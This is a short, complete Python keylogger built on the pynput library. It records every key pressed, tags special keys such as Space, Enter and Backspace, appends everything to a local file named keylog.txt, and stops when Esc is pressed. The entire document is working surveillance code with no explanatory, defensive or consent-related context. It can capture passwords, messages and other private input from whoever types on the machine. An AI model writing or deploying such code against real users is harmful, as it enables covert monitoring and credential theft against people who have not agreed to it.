from pynput.keyboard import Listener, Key

# Path to the log file where keystrokes will be stored
log_file = "keylog.txt"

def on_press(key):
    try:
        # Log the alphanumeric keys
        with open(log_file, 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (Enter, Shift, etc.)
        with open(log_file, 'a') as f:
            if key == Key.space:
                f.write(' [SPACE] ')
            elif key == Key.enter:
                f.write(' [ENTER] \n')
            elif key == Key.backspace:
                f.write(' [BACKSPACE] ')
            else:
                f.write(f' [{key}] ')

def on_release(key):
    # Stop the keylogger if 'Esc' key is pressed
    if key == Key.esc:
        return False

# Setup the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

